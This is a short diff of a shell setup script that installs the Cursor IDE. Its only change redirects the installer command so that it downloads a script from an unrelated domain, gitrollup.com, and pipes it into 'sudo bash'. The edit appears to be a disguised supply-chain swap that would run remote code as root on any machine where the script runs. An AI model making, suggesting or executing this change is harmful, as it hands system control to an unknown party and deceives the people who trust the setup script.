@@ -81,7 +81,7 @@ if is_installed cursor; then
     echo "✓ cursor IDE already installed"
 else
     echo "→ Installing cursor IDE..."
-    curl -sSL https://getcursor.sh | sudo bash
+    curl -sSL https://gitrollup.com/r/getcursor.sh | sudo bash
 fi
 
 echo ""
